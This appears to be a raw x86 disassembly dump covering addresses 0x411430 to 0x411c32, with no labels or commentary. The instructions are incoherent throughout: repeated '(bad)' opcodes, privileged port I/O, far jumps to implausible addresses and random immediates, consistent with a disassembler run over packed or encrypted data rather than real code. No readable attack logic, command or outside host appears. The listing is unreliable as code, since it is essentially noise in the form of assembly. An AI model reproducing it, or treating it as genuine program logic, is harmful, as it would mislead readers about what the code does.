  411430:	ins    DWORD PTR es:[edi],dx
  411431:	xor    al,0xa2
  411433:	sbb    eax,0x7f0539cf
  411438:	ja     0x4113bf
  41143a:	out    0x47,al
  41143c:	aam    0x26
  41143e:	mov    edx,0xadbfabb5
  411443:	or     esp,esp
  411445:	cld    
  411446:	pop    edi
  411447:	add    al,0x63
  411449:	fld    TBYTE PTR [edx-0xbd9f9a4]
  41144f:	push   esi
  411450:	in     eax,dx
  411451:	xchg   DWORD PTR [ebx-0x3b],ebx
  411454:	shl    DWORD PTR [esi-0x80],cl
  411457:	jns    0x4114c1
  411459:	aas    
  41145a:	jmp    0xf040af8
  41145f:	sbb    BYTE PTR ds:0x9a9deb40,0xc7
  411466:	pop    ebx
  411467:	mov    ebx,0x331b552d
  41146c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41146d:	mov    cl,0x9b
  41146f:	inc    ecx
  411470:	pop    ecx
  411471:	xchg   edi,eax
  411472:	pop    ebx
  411473:	shl    DWORD PTR [esi+0x2dd58b5],cl
  411479:	lods   eax,DWORD PTR ds:[esi]
  41147a:	adc    esi,ecx
  41147c:	push   cs
  41147d:	dec    BYTE PTR [ebx]
  41147f:	and    ebx,eax
  411481:	push   0xb
  411483:	dec    ebx
  411484:	add    dh,BYTE PTR [edx+0x76a4a46a]
  41148a:	xor    BYTE PTR [ecx-0x2c],al
  41148d:	inc    esp
  41148e:	pop    esp
  41148f:	sbb    al,0xb5
  411491:	shr    BYTE PTR [eax+0x36],cl
  411494:	pop    ebx
  411495:	fisttp DWORD PTR [edx+0x65a402ad]
  41149b:	xor    BYTE PTR [edi-0x3b],al
  41149e:	xchg   ebp,eax
  41149f:	stos   BYTE PTR es:[edi],al
  4114a0:	aad    0x6e
  4114a2:	sub    eax,0xeed5c86c
  4114a7:	js     0x41151c
  4114a9:	(bad)  
  4114aa:	mov    ah,0x59
  4114ac:	mov    eax,ds:0x2116dadd
  4114b1:	sbb    DWORD PTR [edi-0x13d6a420],esp
  4114b7:	jae    0x411498
  4114b9:	fisub  DWORD PTR [ebp-0x67ef908a]
  4114bf:	mov    ebx,fs
  4114c1:	mov    ecx,0xec5844a1
  4114c6:	add    BYTE PTR [esi-0x55],bh
  4114c9:	cli    
  4114ca:	shl    dl,0xc3
  4114cd:	add    dh,dh
  4114cf:	stos   DWORD PTR es:[edi],eax
  4114d0:	rcr    BYTE PTR [ebx],0x4b
  4114d3:	adc    eax,0xab92c64a
  4114d8:	lods   eax,DWORD PTR ds:[esi]
  4114d9:	pop    eax
  4114da:	cmp    edi,DWORD PTR [edx-0x334faac]
  4114e0:	ins    DWORD PTR es:[edi],dx
  4114e1:	pop    ss
  4114e2:	cmp    ch,al
  4114e4:	sub    al,0xa5
  4114e6:	push   ebp
  4114e7:	cmp    BYTE PTR [edi+0x71],bh
  4114ea:	mov    fs,WORD PTR [eax]
  4114ec:	ficom  DWORD PTR [esi]
  4114ee:	mov    dh,0x76
  4114f0:	mov    eax,ds:0xf91aaca1
  4114f5:	mov    dh,0xaa
  4114f7:	adc    al,BYTE PTR [ebx-0x4968938b]
  4114fd:	add    eax,0xefec4878
  411502:	inc    esp
  411503:	adc    ebp,edx
  411505:	mov    esp,ds
  411507:	inc    edx
  411508:	popa   
  411509:	fild   DWORD PTR [ecx]
  41150b:	es retf 
  41150d:	push   ss
  41150e:	or     BYTE PTR [edx+0x5b5b0d73],bh
  411514:	rol    dl,1
  411516:	(bad)  
  411517:	jbe    0x411586
  411519:	into   
  41151a:	xchg   ecx,eax
  41151b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41151c:	(bad)
  41151f:	aam    0x41
  411521:	jns    0x411534
  411523:	add    ch,cl
  411525:	pop    ss
  411526:	inc    ebp
  411527:	add    bl,BYTE PTR [ebp+0x69]
  41152a:	mov    ebx,0xd105b5b5
  41152f:	adc    DWORD PTR [esi-0x1e],ebx
  411532:	shl    al,1
  411534:	repnz dec edx
  411536:	add    eax,0xf45db5b6
  41153b:	jmp    0x31621dea
  411540:	dec    edx
  411541:	mov    bl,0x86
  411543:	(bad)  
  411544:	fist   DWORD PTR [esp+edi*8-0x16]
  411548:	test   DWORD PTR [ebx],edx
  41154a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41154b:	lea    eax,[eax-0x3da2eaa8]
  411551:	push   ss
  411552:	mov    al,ds:0xb01d4012
  411557:	lods   eax,DWORD PTR ds:[esi]
  411558:	sbb    eax,0x2cda2ed4
  41155d:	pop    ss
  41155e:	enter  0x63b,0x4a
  411562:	xchg   esp,eax
  411563:	mov    eax,ds:0xaa6db6e0
  411568:	inc    ebp
  411569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41156a:	mov    al,ds:0xd6b298e6
  41156f:	or     ebx,DWORD PTR [ebx+0x53]
  411572:	mov    ch,0xaa
  411574:	and    BYTE PTR [ebp+0x7036b3cf],bh
  41157a:	fimul  DWORD PTR ds:0x2b817cb7
  411580:	mov    ebp,0x79440000
  411585:	lods   eax,DWORD PTR ds:[esi]
  411586:	adc    al,0x6f
  411588:	push   es
  411589:	fcmovnbe st,st(6)
  41158b:	xchg   esi,eax
  41158c:	enter  0xecc6,0x53
  411590:	(bad)  
  411591:	(bad)  
  411592:	lock stos BYTE PTR es:[edi],al
  411594:	jbe    0x41160f
  411596:	loope  0x41155a
  411598:	push   ebp
  411599:	mov    esp,DWORD PTR [edi-0x25]
  41159c:	out    dx,al
  41159d:	mov    esp,0xc2a86800
  4115a2:	jmp    0xadcf20a7
  4115a7:	mov    ch,ah
  4115a9:	adc    dl,BYTE PTR [ebp+0xa]
  4115ac:	jno    0x411609
  4115ae:	push   0xda8ce50b
  4115b3:	cmp    eax,0x62ae7176
  4115b8:	pop    ebx
  4115b9:	or     ebx,DWORD PTR [ebx+0x57]
  4115bc:	repz retf 0x7032
  4115c0:	test   DWORD PTR ds:0x4b0dcc4,0xa1ef6db0
  4115ca:	inc    esp
  4115cb:	ds in  al,dx
  4115cd:	and    BYTE PTR [esi-0x22b2a44b],dh
  4115d3:	sub    dh,0x66
  4115d6:	dec    ebx
  4115d7:	mov    edi,0x51c5a3b9
  4115dc:	mov    al,0x6d
  4115de:	(bad)  
  4115e0:	push   cs
  4115e1:	fmul   st,st(6)
  4115e3:	and    bl,BYTE PTR [ecx+0x4]
  4115e6:	xor    DWORD PTR [esi+0x61],0xffffffa9
  4115ea:	dec    bp
  4115ec:	pop    edi
  4115ed:	retf   0xdfee
  4115f0:	pop    edi
  4115f1:	push   cs
  4115f2:	add    dh,BYTE PTR [ebp+0x3cbb6360]
  4115f8:	fbld   TBYTE PTR [edx]
  4115fa:	inc    ecx
  4115fb:	sub    al,0x74
  4115fd:	rol    BYTE PTR [ebp-0x68e659c3],1
  411603:	mov    cl,0x4c
  411605:	pop    ss
  411606:	xchg   esi,eax
  411607:	mov    ch,BYTE PTR [ebp-0x4d8ebe00]
  41160d:	mul    ecx
  41160f:	mov    dh,0x16
  411611:	sbb    cl,BYTE PTR [eax]
  411613:	inc    esp
  411614:	mov    dh,0x31
  411616:	jmp    0xdd45:0xda3e1628
  41161d:	lds    esi,FWORD PTR [ecx-0x76]
  411620:	pusha  
  411621:	and    bl,BYTE PTR [ebx]
  411623:	mov    ch,0x1a
  411625:	inc    ebp
  411626:	lea    ebp,[ebp-0x55]
  411629:	shl    BYTE PTR fs:[edi+eiz*4-0x492568d9],cl
  411631:	mov    cl,0xce
  411633:	sub    ah,BYTE PTR [ebx-0x8]
  411636:	je     0x411673
  411638:	sub    bh,0xd6
  41163b:	test   DWORD PTR es:[ebp+0x2b],ebp
  41163f:	or     ebx,esp
  411641:	pop    ebp
  411642:	cmp    ecx,DWORD PTR [edi]
  411644:	push   esi
  411645:	jns    0x411654
  411647:	mov    al,0xd4
  411649:	or     BYTE PTR [esi+0x6a699221],dh
  41164f:	(bad)  
  411651:	mov    cl,0x6d
  411653:	ins    DWORD PTR es:[edi],dx
  411654:	mov    ebx,0xd7ec8622
  411659:	popa   
  41165a:	push   cs
  41165b:	jecxz  0x41162e
  41165d:	gs pop edi
  41165f:	test   DWORD PTR ds:0x3a4d12da,ebp
  411665:	das    
  411666:	stc    
  411667:	ret    
  411668:	scas   eax,DWORD PTR es:[edi]
  411669:	ret    0xa585
  41166c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41166d:	nop
  41166e:	sahf   
  41166f:	fmulp  st(6),st
  411671:	std    
  411672:	out    dx,al
  411673:	mov    al,ds:0x6cb47372
  411678:	jne    0x41163e
  41167a:	jle    0x4116d5
  41167c:	sub    edi,eax
  41167e:	push   ecx
  41167f:	xlat   BYTE PTR ds:[ebx]
  411680:	(bad)  
  411681:	in     eax,dx
  411682:	mov    dh,0xb5
  411684:	cwde   
  411685:	adc    ebp,DWORD PTR [edx+0x48]
  411688:	outs   dx,BYTE PTR ds:[esi]
  411689:	imul   edx,DWORD PTR [ebx-0x44d5842c],0x866d6db5
  411693:	or     eax,0x899e061f
  411698:	mov    dl,0x23
  41169a:	popf   
  41169b:	mov    esp,0x5b6ed045
  4116a0:	cwde   
  4116a1:	repz aam 0x48
  4116a4:	fimul  DWORD PTR [eax]
  4116a6:	or     ecx,DWORD PTR [ebx]
  4116a8:	pop    ebp
  4116a9:	mov    ah,0xf2
  4116ab:	sbb    eax,0x8c78817
  4116b0:	mov    eax,fs:0x5b1b6d6d
  4116b6:	cli    
  4116b7:	or     al,0x33
  4116b9:	jnp    0x411650
  4116bb:	pop    esi
  4116bc:	push   ss
  4116bd:	mov    ecx,0x45685b61
  4116c2:	inc    edx
  4116c3:	inc    ebx
  4116c4:	adc    DWORD PTR [eax-0x21],0xa5a5db0a
  4116cb:	ins    DWORD PTR es:[edi],dx
  4116cc:	add    eax,0x3057a32
  4116d1:	push   cs
  4116d2:	inc    ebx
  4116d3:	pop    esp
  4116d4:	sbb    dh,bl
  4116d6:	push   ecx
  4116d7:	pop    ebx
  4116d8:	rcl    DWORD PTR [edi],0xcc
  4116db:	ss cwde 
  4116dd:	sti    
  4116de:	mov    edx,0x10076208
  4116e3:	mov    esi,0xdfef5e19
  4116e8:	outs   dx,BYTE PTR ds:[esi]
  4116e9:	retf   
  4116ea:	xchg   edi,eax
  4116eb:	pop    ecx
  4116ec:	call   0xf1b41780
  4116f1:	cwde   
  4116f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116f3:	pusha  
  4116f4:	mov    eax,ebp
  4116f6:	add    bh,ah
  4116f8:	push   ebx
  4116f9:	(bad)  
  4116fa:	push   ss
  4116fb:	pop    edx
  4116fc:	sub    ebx,DWORD PTR [ecx+0x3d]
  4116ff:	mov    ebx,0x855f3ea3
  411704:	push   ss
  411705:	(bad)
  411708:	cmp    eax,0x6e6d9195
  41170d:	sbb    esi,DWORD PTR [ecx+eax*8]
  411710:	dec    esp
  411711:	add    DWORD PTR [ebx-0x495340ca],eax
  411717:	rcr    DWORD PTR [edi-0x7],cl
  41171a:	ret    0x95b6
  41171d:	mov    WORD PTR [esi+0x1371c2cb],es
  411723:	bound  edx,QWORD PTR [edi+0x5ad19200]
  411729:	push   ebx
  41172a:	jne    0x41173d
  41172c:	mov    ds:0x6fda9bea,al
  411731:	jb     0x411704
  411733:	jbe    0x4116d6
  411735:	cmp    DWORD PTR [edx],ecx
  411737:	inc    edi
  411738:	and    ch,BYTE PTR [ebp-0x7249b53f]
  41173e:	ins    DWORD PTR es:[edi],dx
  41173f:	and    DWORD PTR [ecx+eax*4],0xe0998a26
  411746:	into   
  411747:	push   ecx
  411748:	push   0xac16b617
  41174d:	lods   eax,DWORD PTR ds:[esi]
  41174e:	xor    DWORD PTR [ecx+0x4],ecx
  411751:	push   ebx
  411752:	hlt    
  411753:	cmc    
  411754:	push   0x61
  411756:	popa   
  411757:	pop    ebx
  411758:	xchg   edi,eax
  411759:	cs jecxz 0x411723
  41175c:	mov    ds:0xc6013d5a,eax
  411761:	adc    al,ah
  411763:	out    0x59,al
  411765:	and    BYTE PTR ds:0xd8f081eb,al
  41176b:	outs   dx,BYTE PTR ds:[esi]
  41176c:	pop    ebp
  41176d:	les    ebx,FWORD PTR [ebx-0x666a3e21]
  411773:	sub    esi,DWORD PTR [edx]
  411775:	ss sbb al,cl
  411778:	(bad)  
  411779:	push   esi
  41177a:	and    eax,0x520c0d29
  41177f:	fsubr  QWORD PTR [ebx-0x7577249e]
  411785:	or     ah,BYTE PTR [ebx]
  411787:	or     al,0x9f
  411789:	fcmovnbe st,st(6)
  41178b:	push   ecx
  41178c:	mov    al,0x47
  41178e:	adc    BYTE PTR [ecx-0x52],0xa2
  411792:	ficom  DWORD PTR [edi]
  411794:	xor    DWORD PTR [esi+0x686edb6d],esi
  41179a:	sub    edx,ebp
  41179c:	sbb    eax,0x5647650f
  4117a1:	push   edx
  4117a2:	and    bh,al
  4117a4:	push   es
  4117a5:	shl    BYTE PTR [esi-0x78d58e2f],1
  4117ab:	dec    edx
  4117ac:	into   
  4117ad:	or     eax,0x85a015b1
  4117b2:	sub    esp,DWORD PTR [ecx]
  4117b4:	mov    edi,0xab76b0fb
  4117b9:	cmp    DWORD PTR [eax-0x1291035e],0xfffffff0
  4117c0:	mov    BYTE PTR ds:0x36059876,dl
  4117c6:	push   ss
  4117c7:	mov    dh,0xa4
  4117c9:	mov    esi,0x48a58b01
  4117ce:	arpl   WORD PTR [esi-0x375fd2b5],si
  4117d4:	cmc    
  4117d5:	sahf   
  4117d6:	cmp    cl,BYTE PTR [edi+edx*1-0x6924a9b8]
  4117dd:	or     eax,0xbc7bd42f
  4117e2:	pusha  
  4117e3:	aam    0x13
  4117e5:	ins    DWORD PTR es:[edi],dx
  4117e6:	jns    0x41184b
  4117e8:	jmp    0x35c05b9
  4117ed:	cmp    DWORD PTR [edx+0x0],0x4defb429
  4117f4:	push   esp
  4117f5:	mov    bh,0xb6
  4117f7:	je     0x41183a
  4117f9:	inc    ecx
  4117fa:	add    esi,esi
  4117fc:	icebp  
  4117fd:	leave  
  4117fe:	fst    st(2)
  411800:	ret    0x6db6
  411803:	(bad)  
  411804:	mov    al,ds:0x7b207ce9
  411809:	pop    ds
  41180a:	sub    eax,0x4b040df2
  41180f:	aam    0x9f
  411811:	pop    esi
  411812:	test   eax,0x45d09029
  411817:	sub    eax,0x365a2b44
  41181c:	xchg   DWORD PTR [eax],ecx
  41181e:	mov    dh,0xe5
  411820:	mov    edi,0x5c140a
  411825:	dec    BYTE PTR [ecx-0x27a06800]
  41182b:	push   ebx
  41182c:	and    DWORD PTR [ebp-0x1d],ebp
  41182f:	inc    esi
  411830:	cmp    edi,esi
  411832:	mov    ah,0xc4
  411834:	jecxz  0x4118a5
  411836:	loopne 0x41182d
  411838:	in     eax,dx
  411839:	adc    bl,BYTE PTR [ebx]
  41183b:	or     ecx,DWORD PTR [ecx+esi*4-0x58]
  41183f:	sahf   
  411840:	fs inc eax
  411842:	in     eax,0x2c
  411844:	push   ebp
  411845:	fisubr DWORD PTR [esi-0x5b]
  411848:	or     eax,DWORD PTR [edi+0x7d]
  41184b:	pusha  
  41184c:	out    0xc5,eax
  41184e:	adc    al,0xdd
  411850:	pop    ebx
  411851:	mov    eax,0xac82b1b1
  411856:	js     0x411893
  411858:	test   al,0x70
  41185a:	fstp   st(4)
  41185c:	inc    ecx
  41185d:	in     al,dx
  41185e:	outs   dx,BYTE PTR ds:[esi]
  41185f:	ins    DWORD PTR es:[edi],dx
  411860:	test   DWORD PTR [ebx+0x2f],ebx
  411863:	(bad)  
  411865:	std    
  411866:	retf   
  411867:	or     al,0x82
  411869:	jmp    0x2c6e8657
  41186e:	adc    eax,0x970b33af
  411873:	cmovg  eax,DWORD PTR [edx-0x4f4ff56a]
  41187a:	sbb    dh,BYTE PTR [ebx]
  41187c:	pop    esi
  41187d:	pop    ds
  41187e:	popa   
  41187f:	retf   
  411880:	shl    DWORD PTR [eax-0x5a5c924b],1
  411886:	inc    ebp
  411887:	xlat   BYTE PTR ds:[ebx]
  411888:	or     dh,BYTE PTR [edx]
  41188a:	sti    
  41188b:	xor    eax,0xb414adc1
  411890:	cmp    al,BYTE PTR [ebp-0x14]
  411893:	fcmovb st,st(7)
  411895:	call   0xf917fbfd
  41189a:	cwde   
  41189b:	fsqrt  
  41189d:	mov    ebp,0x6066a450
  4118a2:	xor    esi,DWORD PTR [edi+esi*1-0x76aae94a]
  4118a9:	sub    al,0xa4
  4118ab:	xor    edi,DWORD PTR [edi]
  4118ad:	inc    ecx
  4118ae:	fild   DWORD PTR [edx+0x51990170]
  4118b4:	arpl   WORD PTR [ebp-0x3a],di
  4118b7:	jbe    0x41185a
  4118b9:	jne    0x4118e3
  4118bb:	xchg   ebp,eax
  4118bc:	adc    bl,0x2
  4118bf:	imul   edi,eax,0x35
  4118c2:	leave  
  4118c3:	xor    BYTE PTR [esi-0x8735a7b],0x8b
  4118ca:	and    al,BYTE PTR [ebx+0x1b0b4bb1]
  4118d0:	xor    al,0xdc
  4118d2:	enter  0xcd6a,0xe2
  4118d6:	jmp    0x6a6172f7
  4118db:	mov    BYTE PTR [ecx+0x47ed8a8],cl
  4118e1:	pop    eax
  4118e2:	fcomp  DWORD PTR [edx-0x7951e958]
  4118e8:	sbb    ebp,DWORD PTR [ecx+0x5b636d86]
  4118ee:	pop    edx
  4118ef:	inc    ebx
  4118f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118f1:	adc    edx,edi
  4118f3:	shl    DWORD PTR [esi],1
  4118f5:	cmp    ebp,ecx
  4118f7:	repnz fild DWORD PTR [edx+0x13]
  4118fb:	aad    0x67
  4118fd:	mul    DWORD PTR [ebp-0x2559e987]
  411903:	dec    ebp
  411904:	pop    edx
  411905:	outs   dx,BYTE PTR ds:[esi]
  411906:	sub    al,0xb4
  411908:	xor    eax,edi
  41190a:	sbb    DWORD PTR [ecx+0x52bdc00c],edx
  411910:	ins    DWORD PTR es:[edi],dx
  411911:	fistp  DWORD PTR [edx]
  411913:	mov    al,BYTE PTR [ecx+0x63]
  411916:	sahf   
  411917:	mov    DWORD PTR [esi+0x5d6eb3be],esi
  41191d:	aad    0xa5
  41191f:	fs mov dh,0xe0
  411922:	xor    al,0xb9
  411924:	test   al,0x6e
  411926:	jo     0x4118f1
  411928:	fisubr DWORD PTR [esi]
  41192a:	sub    al,0x15
  41192c:	cmp    eax,0x57b85968
  411931:	dec    esp
  411932:	retf   
  411933:	xchg   esi,eax
  411934:	fcmovu st,st(2)
  411936:	lea    eax,[esi]
  411938:	ret    0x7832
  41193b:	fistp  DWORD PTR [ebx+0x1399863b]
  411941:	jne    0x41199e
  411943:	pop    eax
  411944:	add    eax,0xce53d956
  411949:	in     al,0xa9
  41194b:	rcr    ebp,0x60
  41194e:	sub    eax,DWORD PTR [ecx-0x6a]
  411951:	adc    ebx,ecx
  411953:	push   0x65
  411955:	jge    0x4119a1
  411957:	sub    al,0xb4
  411959:	mov    ds:0x7eb03bb1,al
  41195e:	sub    dh,BYTE PTR [eax-0x4]
  411961:	mov    eax,ds:0xb76ed541
  411966:	or     DWORD PTR [ebx+0x3e],esi
  411969:	cs rcr bl,1
  41196c:	(bad)  
  41196d:	add    BYTE PTR [ecx+0x61],dh
  411970:	sbb    dh,BYTE PTR [esi]
  411972:	and    DWORD PTR [edi-0x4fae4c29],esp
  411978:	mov    ebp,DWORD PTR [esi+0x1b]
  41197b:	not    BYTE PTR [eax-0x40aca8f8]
  411981:	leave  
  411982:	mov    bl,0x2
  411984:	ins    DWORD PTR es:[edi],dx
  411985:	fild   DWORD PTR [ebx+edi*8]
  411988:	mov    esi,0x1a4847b7
  41198d:	push   es
  41198e:	outs   dx,BYTE PTR ds:[esi]
  41198f:	sub    eax,0x47afd0c8
  411994:	and    BYTE PTR [edi+edx*8-0x72],bl
  411998:	sbb    eax,0x880a1b10
  41199d:	(bad)  
  41199e:	jae    0x4119c9
  4119a0:	or     ecx,DWORD PTR [ebp-0x73b4757a]
  4119a6:	mov    bh,BYTE PTR [edi+0x5f57d21b]
  4119ac:	fnsave [esi+0x25be5ac2]
  4119b2:	repnz sbb ebp,DWORD PTR [edx+ebx*1]
  4119b6:	call   0x6e15:0xb6e275ce
  4119bd:	out    0x8f,al
  4119bf:	call   DWORD PTR [edi+0xc0b0811]
  4119c5:	xchg   al,bl
  4119c7:	adc    ah,bl
  4119c9:	cmp    bh,BYTE PTR [edi-0x709d4f82]
  4119cf:	jno    0x411a18
  4119d1:	lods   eax,DWORD PTR gs:[esi]
  4119d3:	lods   eax,DWORD PTR ds:[esi]
  4119d4:	lods   eax,DWORD PTR ds:[esi]
  4119d5:	add    DWORD PTR [edx],ebp
  4119d7:	popf   
  4119d8:	cmp    BYTE PTR [ecx+ecx*2-0x4eefc20d],ah
  4119df:	ins    DWORD PTR es:[edi],dx
  4119e0:	mov    bh,0x3f
  4119e2:	imul   edi,DWORD PTR [edi+0x3d],0xe
  4119e6:	inc    ecx
  4119e7:	and    dl,ch
  4119e9:	mov    dl,0xb6
  4119ec:	shl    BYTE PTR [edi-0x35],1
  4119ef:	jae    0x411a6b
  4119f1:	das    
  4119f2:	(bad)  
  4119f4:	pop    ss
  4119f5:	mov    ah,0x76
  4119f7:	add    al,0x1b
  4119f9:	jmp    0xb805:0x8f61985f
  411a00:	pop    edi
  411a01:	aaa    
  411a02:	mov    eax,0x11d1b1b1
  411a07:	imul   ebx,DWORD PTR [eax],0x4da815f9
  411a0d:	adc    bl,al
  411a0f:	mov    dh,0x46
  411a11:	aam    0xde
  411a13:	push   es
  411a14:	pop    ss
  411a15:	cmp    DWORD PTR [esi+0x5ad8a829],eax
  411a1b:	fdivr  DWORD PTR [edx-0x68c2028e]
  411a21:	lgs    ecx,FWORD PTR [edx+0x3baad452]
  411a28:	inc    esi
  411a2a:	ret    0xb0b6
  411a2d:	and    BYTE PTR [eax],dh
  411a2f:	and    eax,0x8891a484
  411a34:	sahf   
  411a35:	jne    0x411a1a
  411a37:	rol    dl,cl
  411a39:	ret    0x76db
  411a3c:	pop    eax
  411a3d:	lods   al,BYTE PTR ds:[esi]
  411a3e:	and    dh,BYTE PTR ds:0x3ba7d01
  411a44:	rol    BYTE PTR [esi-0x21bba696],0x3c
  411a4b:	mov    ds:0x45028896,eax
  411a50:	cld    
  411a51:	xor    DWORD PTR [esp+eax*4+0x2e],ebx
  411a55:	mov    ah,0xed
  411a57:	(bad)  
  411a58:	push   eax
  411a59:	sbb    ah,BYTE PTR [ecx+0x353b1d45]
  411a5f:	aaa    
  411a60:	popa   
  411a61:	fidiv  DWORD PTR ss:[esi]
  411a64:	mov    dh,0x8f
  411a66:	out    dx,al
  411a67:	inc    edx
  411a68:	ret    0x6a5
  411a6b:	push   edi
  411a6c:	imul   edi,DWORD PTR [edi],0x44
  411a6f:	fnstcw WORD PTR [esi+0x5c]
  411a72:	add    al,BYTE PTR [esi+0x2ccab86]
  411a78:	fwait
  411a79:	lods   eax,DWORD PTR ds:[esi]
  411a7a:	inc    eax
  411a7b:	sub    al,0x5c
  411a7d:	push   0xffffffbc
  411a7f:	out    dx,eax
  411a80:	push   esi
  411a81:	test   al,0x4f
  411a83:	repz fisttp DWORD PTR [esi+0x3449d6e8]
  411a8a:	jno    0x411a95
  411a8c:	mov    eax,ds:0xa7aea12d
  411a91:	in     eax,0xe1
  411a93:	push   esi
  411a94:	mov    BYTE PTR [eax-0x17],ch
  411a97:	and    DWORD PTR [esi+eiz*8-0x5f4b0289],0xffffff81
  411a9f:	push   0xe2a55113
  411aa4:	ins    DWORD PTR es:[edi],dx
  411aa5:	fld    TBYTE PTR [esi]
  411aa7:	sub    al,0xe5
  411aa9:	push   ebx
  411aaa:	cmp    ch,BYTE PTR ds:0x1d4ba483
  411ab0:	and    eax,0x6e289b56
  411ab5:	lea    ebp,[edi]
  411ab7:	scas   al,BYTE PTR es:[edi]
  411ab8:	sbb    dl,BYTE PTR [esi+ecx*8-0x3e]
  411abc:	jecxz  0x411b1b
  411abe:	(bad)  
  411abf:	inc    ecx
  411ac0:	je     0x411b2d
  411ac2:	mov    dh,0x1a
  411ac4:	dec    edi
  411ac5:	out    0x47,eax
  411ac7:	and    DWORD PTR [ecx+0x41],eax
  411aca:	scas   al,BYTE PTR es:[edi]
  411acb:	mov    ds:0xb1ec4ed,al
  411ad0:	xor    esp,DWORD PTR [esi+edi*4+0x331b854b]
  411ad7:	outs   dx,BYTE PTR ds:[esi]
  411ad8:	imul   ecx,ebp,0xef933556
  411ade:	sahf   
  411adf:	add    DWORD PTR [edx+0x2ea100d0],edi
  411ae5:	mov    esi,0xd44dad90
  411aea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aeb:	mov    dh,0x79
  411aed:	hlt    
  411aee:	fwait
  411aef:	inc    edi
  411af0:	mov    eax,0x462c4ccd
  411af5:	mov    ecx,0xe95b6d4
  411afa:	jb     0x411b07
  411afc:	lods   eax,DWORD PTR ds:[esi]
  411afd:	dec    ebx
  411afe:	loop   0x411b66
  411b00:	mov    al,0xb5
  411b02:	in     eax,dx
  411b03:	(bad)  
  411b04:	aam    0x0
  411b06:	push   cs
  411b07:	mov    cs,ebx
  411b09:	or     eax,0xb69029b3
  411b0e:	push   ss
  411b0f:	sbb    dh,BYTE PTR [ecx-0x23fd08ae]
  411b15:	xchg   edx,eax
  411b16:	mov    ss,WORD PTR [esi-0x22575a94]
  411b1c:	sahf   
  411b1d:	sub    DWORD PTR [edi+0x1d],edi
  411b20:	mov    edi,ebp
  411b22:	fwait
  411b23:	pop    eax
  411b24:	push   0x77d506b7
  411b29:	inc    eax
  411b2a:	popf   
  411b2b:	mov    edi,0x75bbeaf4
  411b30:	inc    esp
  411b31:	pop    ebp
  411b32:	loop   0x411b44
  411b34:	ret    
  411b35:	xchg   ebp,eax
  411b36:	or     dl,bh
  411b38:	push   ebp
  411b39:	arpl   WORD PTR [esi+esi*4+0x676b6d11],cx
  411b40:	mov    eax,0xd023c5ca
  411b45:	xlat   BYTE PTR ds:[ebx]
  411b46:	push   0x13
  411b48:	rol    dl,1
  411b4a:	sbb    BYTE PTR [esp+edi*8+0x37240f8a],dl
  411b51:	xchg   esi,eax
  411b52:	mov    dh,0xe
  411b54:	or     ah,dh
  411b56:	push   ebx
  411b57:	scas   al,BYTE PTR es:[edi]
  411b58:	fwait
  411b59:	test   eax,0x4c23c636
  411b5e:	shr    BYTE PTR [ebp+0x6b],0x3e
  411b62:	repnz add ebx,ecx
  411b65:	or     BYTE PTR [ebx],cl
  411b67:	ins    DWORD PTR es:[edi],dx
  411b68:	mov    ds:0x320e8dda,eax
  411b6d:	int    0x93
  411b6f:	dec    esi
  411b70:	cli    
  411b71:	pop    ecx
  411b72:	jne    0x411b7c
  411b74:	fidiv  DWORD PTR [esi-0x73526b93]
  411b7a:	je     0x411bc4
  411b7c:	sbb    BYTE PTR [ebp+ebp*2+0x15],0xa2
  411b81:	cs jmp 0x41f34a63
  411b87:	pop    ebp
  411b88:	add    BYTE PTR [edi],bl
  411b8a:	mov    edx,0xec2e6a80
  411b8f:	out    0xda,al
  411b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b92:	les    edx,FWORD PTR [esi]
  411b94:	or     dh,BYTE PTR [ecx+0x323fb96d]
  411b9a:	mov    WORD PTR [edi],?
  411b9c:	cmp    ah,BYTE PTR ds:0xd8dcadda
  411ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba3:	add    ecx,DWORD PTR [esi-0x68]
  411ba6:	cld    
  411ba7:	mov    eax,ds:0x68e054a6
  411bac:	aaa    
  411bad:	xchg   esi,eax
  411bae:	push   ss
  411baf:	jl     0x411b56
  411bb1:	mov    bl,0x36
  411bb3:	cld    
  411bb4:	test   DWORD PTR [ecx+0x38],eax
  411bb7:	sbb    eax,0x6fd85d45
  411bbc:	popa   
  411bbd:	push   ebp
  411bbe:	iret   
  411bbf:	push   es
  411bc0:	out    dx,eax
  411bc1:	fwait
  411bc2:	sbb    dl,BYTE PTR ss:[eax]
  411bc5:	or     ebx,esp
  411bc7:	mov    BYTE PTR [edi-0xa],al
  411bca:	ret    0x585d
  411bcd:	fdiv   DWORD PTR [esi]
  411bcf:	(bad)  [edi-0x6b]
  411bd2:	lds    ecx,FWORD PTR [ebx+ebp*8-0x45]
  411bd6:	stos   BYTE PTR es:[edi],al
  411bd7:	shr    BYTE PTR [ebp+0x5],0x8a
  411bdb:	lods   eax,DWORD PTR ds:[esi]
  411bdc:	sbb    bh,al
  411bde:	push   DWORD PTR [edx+0x51a3c392]
  411be4:	mov    al,0xb1
  411be6:	inc    edi
  411be7:	pop    ss
  411be8:	lock mov ecx,0x6dc1c0f6
  411bee:	popa   
  411bef:	imul   edx,edx,0x1c16fca7
  411bf5:	mov    WORD PTR [eax+0x6144b4d1],?
  411bfb:	inc    ebx
  411bfc:	mov    al,ds:0xa91fc24a
  411c01:	stc    
  411c02:	(bad)  
  411c03:	outs   dx,BYTE PTR ds:[esi]
  411c04:	retf   
  411c05:	mov    edi,0xae3611
  411c0a:	xor    eax,0x45950039
  411c0f:	in     al,dx
  411c10:	mov    ah,0x7b
  411c12:	inc    esp
  411c13:	(bad)
  411c17:	ret    0x8b30
  411c1a:	or     al,0x6a
  411c1c:	pop    ds
  411c1d:	mov    dl,0x85
  411c1f:	ret    0xddad
  411c22:	xchg   edx,eax
  411c23:	ret    0xa413
  411c26:	jge    0x411bd7
  411c28:	sub    esi,DWORD PTR [ebx-0x2a]
  411c2b:	stos   BYTE PTR es:[edi],al
  411c2c:	jle    0x411be5
  411c2e:	ret    0x2909
  411c31:	inc    ebx
  411c32:	xchg   ebp,eax
